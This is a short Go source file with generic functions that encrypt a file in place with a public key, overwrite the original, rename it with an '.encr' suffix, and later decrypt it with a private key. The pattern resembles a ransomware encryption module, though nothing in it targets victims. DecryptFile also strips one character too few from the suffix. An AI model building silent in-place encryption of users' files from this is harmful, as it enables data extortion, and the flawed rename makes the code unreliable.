package io

import (
	"os"
	"strings"
)

type File struct {
	Info      os.FileInfo
	Path      string
	Extension string
}

func EncryptFile[Key any](
	file *File,
	encrypt func([]byte, Key) ([]byte, error),
	pubKey Key) error {

	osFile, err := os.Open(file.Path)
	if err != nil {
		return err
	}

	buffer := make([]byte, file.Info.Size())
	osFile.Read(buffer)
	osFile.Close()

	encrypted, err := encrypt(buffer, pubKey)
	if err != nil {
		return err
	}

	osFile, err = os.Create(file.Path)
	if err != nil {
		return err
	}
	_, err = osFile.Write(encrypted)
	if err != nil {
		return err
	}

	osFile.Close()
	os.Rename(file.Path, file.Path+".encr")

	return nil
}

func DecryptFile[Key any](
	file *File,
	decrypt func([]byte, Key) []byte,
	privKey Key) error {

	split := strings.Split(file.Path, ".")

	if split[len(split)-1] == "encr" {

		osFile, err := os.Open(file.Path)
		if err != nil {
			return err
		}

		buffer := make([]byte, file.Info.Size())

		osFile.Read(buffer)

		osFile.Close()

		decrypted := decrypt(buffer, privKey)

		osFile, _ = os.Create(file.Path)
		_, err = osFile.Write(decrypted)
		if err != nil {
			return err
		}

		osFile.Close()
		os.Rename(file.Path, file.Path[:len(file.Path)-4])
	}
	return nil
}
